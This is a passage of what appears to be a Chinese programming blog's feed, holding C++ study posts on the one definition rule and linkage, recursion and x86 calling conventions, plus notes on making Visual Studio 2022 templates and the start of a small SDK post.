class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhh&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">void</span> <span class="title">hh</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line"><span class="built_in">hh</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到hh函数其实没有定义过，也未在其他文件有过声明，我们直接调用就会</p><img src="/2022/06/15/ODR/000.png" class=""><p>也就是link链接的时候发生的错误。<br>如果这个函数没有被调用其实就不会报错了。</p><hr><h2 id="未定义行为"><a href="#未定义行为" class="headerlink" title="未定义行为"></a>未定义行为</h2><p>c++标准未作规定的行为被称为未定义行为，未定义行为的结果是不确定的，具体表现在不同编译器之间。</p><ol><li>c &#x3D; 2*a++ + ++a*6</li><li>int x &#x3D; -25602; x &#x3D; x &gt;&gt; 2;</li></ol><p>拿1来说，a++是规定好的语法，x + a++的话是规定好了，先算x+a，再让a++; 这种简单的复合运算通过提前规定好而规避错误。但是人总是闲的蛋疼，就会整出一些无理由的题，这些题目不能百分之百的给你一个完美的解。<br>而例1的写法，谁能知道先算a++还是++a呢，如果++a先被计算了，那么前面的值肯定偏大了。抛开被优化了之后，有些可能交给寄存器处理了，所以意义不同了。</p><p>例2 纠结之处在于 负数有符号位，补0和1的时候结果大不相同，所以位运算尽量交给正数。</p><hr><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>那么ODR的体现就在于程序中定义的每个对象都有自己的规则。<br>在c++20中 任何变量、函数、类、枚举、模板在每个转换单元中都只允许有一个定义；<br>在c++17中非inline的函数或者变量在程序中有且只有一个定义；</p><p>什么叫定义和声明应该不用多做赘述</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这种多个声明但是只有一个定义就没什么事，否则编译器就会给出报错。</p><img src="/2022/06/15/ODR/001.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a = <span class="number">250</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">250</span>;</span><br><span class="line"><span class="keyword">inline</span> <span class="type">int</span> a = <span class="number">250</span>; <span class="comment">//c++17</span></span><br></pre></td></tr></table></figure><p>以上几个在一个项目里多个源文件重复定义了才不会报错，因为它们都有各自的内存空间。</p><hr><h2 id="链接属性"><a href="#链接属性" class="headerlink" title="链接属性"></a>链接属性</h2><p>之前看到过报错信息，函数在链接的时候的名字，c语言是直接在函数名前加了一个_，而c++ 因为有重载，所以要把类型参数等信息表现出来。</p><p>链接属性：</p><ol><li>内部链接属性：就是说这个名称只在本转换单元有效</li><li>外部链接属性：就是说这个名称在其他的转换单元中也有效</li><li>无链接属性：就是说这个名称只在作用域内访问</li></ol><p>这些个点在函数和变量上都能有所表现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> h = <span class="number">100</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> a = <span class="number">200</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;...&#125;</span><br></pre></td></tr></table></figure><blockquote><p>静态的函数，肯定是内部链接属性，他无法被其他文件调用<br>静态变量或者const常量，也同样是内部连接属性，在其他文件定义相同名称的并不影响编译</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">hhh</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;...&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这种正常的全局函数或者变量就具有外部链接属性，在本质上他其实在编译的时候就加上了extern，作为外部声明。<br>所以一个const变量，也可以通过extern 被外部所发现。但是还是少用吧。</p></blockquote><p>如果就是希望这个变量或者函数没有外部属性，最常见就是static限定。<br>但是c++后期标准不推荐使用static，而是推荐一个未命名空间。<br>当然标准是一代一代继承的，不可能直接否定掉以前的办法。</p><hr><h3 id="inline和static"><a href="#inline和static" class="headerlink" title="inline和static"></a>inline和static</h3><p>在c++17之后才出现的inline 变量的写法。<br>先前的static 变量和函数都是没有问题的。<br>所以要特别注意下，开发的时候规定项目语法标准，免得有争议。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">int</span> a = <span class="number">350</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">int</span> a = <span class="number">1000</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种情况下，inline的a还能不一样吗？</p><img src="/2022/06/15/ODR/002.png" class=""><p>看到a的值都是main.cpp中定义的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.cppp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">int</span> a = <span class="number">1000</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> b = <span class="number">2000</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">int</span> a = <span class="number">350</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> b = <span class="number">250</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看static的情况</p><img src="/2022/06/15/ODR/003.png" class=""><p><strong>说明inline仍然是外部链接属性，static才是内部链接属性</strong><br>也就是为什么之前c++17提到非inline的才只有一个定义。</p><p>避免的方式也有，就是写进头文件，因为一般定义头文件的时候都会有<code>#pragma once</code>这种防重的，这样的话就不会管其他地方定义的是什么样的，只看头文件里面就好了。</p><p>变量已是如此，函数当然亦是如此~</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">int</span> a = <span class="number">1000</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> b = <span class="number">2000</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testp</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">Test</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">int</span> a = <span class="number">350</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> b = <span class="number">250</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testp</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">testp</span>();</span><br><span class="line"><span class="built_in">Test</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/15/ODR/004.png" class=""><p>能够看到main.cpp的static void Test写法跟test.cpp没啥差别，但是两个函数作用在不同的文件。<br>也就说明了static的变量或函数都有不同的内存分配。</p><p>函数改成inline结果也不用多想，就会按照main.cpp的来了</p><img src="/2022/06/15/ODR/005.png" class=""><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>倒也不是啥大事，一些编译器和语法标准的问题。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>递归函数</title>
      <link href="/2022/06/14/function12/"/>
      <url>/2022/06/14/function12/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>递归主要是应对与数学场景吧。<br>简单来说就是函数 直接或间接的调用了自己，那么这个函数就可以说时递归函数<br><strong>内联函数不能作为递归函数</strong></p><span id="more"></span><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(...)</span><br><span class="line">        <span class="built_in">hhh</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>接触最早的递归函数应该是阶乘了。<br>n! &#x3D; 1 x 2 x 3 x 4 x…(n-1) x n</p><p>按照函数的操作，就是传递一个参数，每次乘以这个参数-1，当参数&#x3D;&#x3D;1的时候就返回参数就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">return</span> x * <span class="built_in">func</span>(x - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设x&#x3D;10</p><blockquote><p>10 x func(9)<br>9 x func(8)<br>8 x func(7)<br>7 x func(6)<br>6 x func(5)<br>…<br>2 x 1 &#x2F;&#x2F; x&#x3D;&#x3D;1,return x;所以不进函数了。</p></blockquote><p><strong>递归函数用的时候一定要能结束。。。不然堆栈溢出程序也没法跑</strong></p><p>当然你说这种操作用for循环其实还更快，都不用反复入栈了。但递归在可阅读性和逻辑上总归有益处。<br>要相信能活下来的总归有道理，而且设计一个递归函数难度也不小。</p><hr><p>抛开函数调用自己，如果函数反复调用其他函数或者多个函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func0</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">func1</span>();....</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//示意模板而已</span></span><br></pre></td></tr></table></figure><p>函数之间调用进行递归，更需要注意安全。且也要保证能够被解读。不如还不如for循环。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>递归更加适用于树形结构的情况。<br>一个良好的递归函数，我们期望它每一次都更接近答案，并且能够在特定情况下终止处理。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数调用约定</title>
      <link href="/2022/06/14/function11/"/>
      <url>/2022/06/14/function11/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>函数调用和被调用之间肯定要规定，如何传递参数，如何恢复栈平衡的问题。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>程序运行最开始，main函数肯定是第一个入栈的，其他的函数被调用时相继入栈。</p><hr><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="_cdecl"></a>_cdecl</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译自然报错，但是我们看报错信息</p><img src="/2022/06/14/function11/000.png" class=""><p>之前说到过C语言处理函数在.obj文件下都是加一个<code>_</code><br>而c++因为有重载的功能所以还多了参数，除此之外就是<code>_cdecl</code></p><p><code>_cdecl</code>的参数入栈 <code>从右到左</code></p><img src="/2022/06/14/function11/001.png" class=""><p>堆栈平衡：谁调用谁平衡</p><img src="/2022/06/14/function11/003.png" class=""><p>所以这种方式能够支持不定量参数。 不定量详情看function1吧，好像写在那里了。</p><blockquote><p>虽然不定量，但是毕竟是从右边开始传递，所以不会出现丢三落四的情况。</p></blockquote><hr><h2 id="stdcall"><a href="#stdcall" class="headerlink" title="_stdcall"></a>_stdcall</h2><p>因为一般都是_cdecl 所以这玩意比较少见，但是反正能指定。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> _stdcall <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_stdcall</code>的参数入栈顺序同为 从右往左<br>堆栈平衡：由函数自己恢复栈平衡</p><img src="/2022/06/14/function11/002.png" class=""><p>特色就是windows编程中WINAPI CALLBACK都是<code>_stdcall</code>的宏<br>并且生成的函数名会加下划线，后面跟@和参数尺寸</p><img src="/2022/06/14/function11/004.png" class=""><hr><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="_fastcall"></a>_fastcall</h2><p>fast看着就想快速</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> _fastcall <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的特点就是第一个参数由ecx寄存器传递，第二个参数由dex寄存器传递<br>剩余参数仍然按照入栈顺序 从右到左依次入栈</p><img src="/2022/06/14/function11/005.png" class=""><p>可以看到俩参数没有通过push指令压入栈中，而是mov给寄存器。</p><p>堆栈平衡：由函数自己恢复栈平衡</p><img src="/2022/06/14/function11/006.png" class=""><p>因为有俩寄存器调用了，所以相对而言会比较快。</p><blockquote><p>当多个形参，比如三个时，add(1,2,3);<br>3先被push入栈，2和1分别交给寄存器<br>恢复栈平衡的时候ret 4。 就是只压入了一个3，所以要释放掉。</p></blockquote><hr><h2 id="其他调用"><a href="#其他调用" class="headerlink" title="其他调用"></a>其他调用</h2><p>_thiscall 是用于c++中类的访问，用到类的底层时再看<br>naked call是一个常用的约定，一般也就是实验模式驱动开发</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>有特殊需求的时候自然会指定函数的调用方式。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】vs2022自定义模板</title>
      <link href="/2022/06/12/myproject/"/>
      <url>/2022/06/12/myproject/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>搞了丐版sdk之后，还可以搞个自己所谓的项目类型。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h2><p>模板自然是指可以省去一些基本操作，比如每次新建项目都要新建一个源文件，然后写代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之类的操作。<br>创建一个项目模板的好处是除了文件模板，还对项目有额外引用库什么的选项一并设置好。</p><p>这里用项目模板举例就直接套上个sdk项目的了</p><img src="/2022/06/12/myproject/000.png" class=""><img src="/2022/06/12/myproject/001.png" class=""><p>下一步就完事</p><img src="/2022/06/12/myproject/002.png" class=""><p>至于要不要图标什么的自己选就行，然后输出位置可以默认也可以自己操作，但是不了解的情况下就先用默认的。</p><p>完成之后会打开那个文件夹能看到一个lowskd.zip的文件</p><blockquote><p>这里手快了名字敲反了罪过。。</p></blockquote><p>然后新建项目就能看到多了一个选项是自建的</p><img src="/2022/06/12/myproject/003.png" class=""><p>然后顺着这个类型新建项目</p><img src="/2022/06/12/myproject/004.png" class=""><p>发现文件默认就在了。并且库的路径也存在属性中</p><img src="/2022/06/12/myproject/005.png" class=""><hr><h2 id="模板文件"><a href="#模板文件" class="headerlink" title="模板文件"></a>模板文件</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次新建其实都要输入这个。</p><p>那么在建模板的时候就看到了其实可以对文件也进行操作。<br>老样子在项目里选择导出模板</p><img src="/2022/06/12/myproject/006.png" class=""><p>选择导出项</p><img src="/2022/06/12/myproject/007.png" class=""><p>选择源文件里面的这个文件</p><img src="/2022/06/12/myproject/008.png" class=""><p>老样子要改的地方改一下。名字的话为了更贴切可以用main，因为新建类型文件的时候</p><img src="/2022/06/12/myproject/009.png" class=""><hr><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>有两个地方要删除，不然好像还是会存在</p><ol><li>C:\Users\用户名\Documents\Visual Studio 2022\My Exported Templates</li><li><ol><li>C:\Users\用户名\Documents\Visual Studio 2022\Templates\ItemTemplates  &#x2F;&#x2F;这个属于项</li><li>C:\Users\用户名\Documents\Visual Studio 2022\Templates\ProjectTemplates   &#x2F;&#x2F;这个属于项目</li></ol></li></ol><p>好像是2022变多了，网上搜的17和19 第二个地方其实是一个，不过问题不大，看到那个新建的.zip干掉就行了。</p><p>要是在细点，其实应该在分类，因为这俩文件夹里面有不同类型的语种，我们这些zip其实应该放到各自的里面。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>不过这玩意总归先敲敲熟，熟了自然摸鱼。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sdk丐版</title>
      <link href="/2022/06/11/sdk/"/>
      <url>/2022/06/11/sdk/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也算不上太牛的</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>封装一些简单的功能。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mysdk.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDK_VERSION <span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> 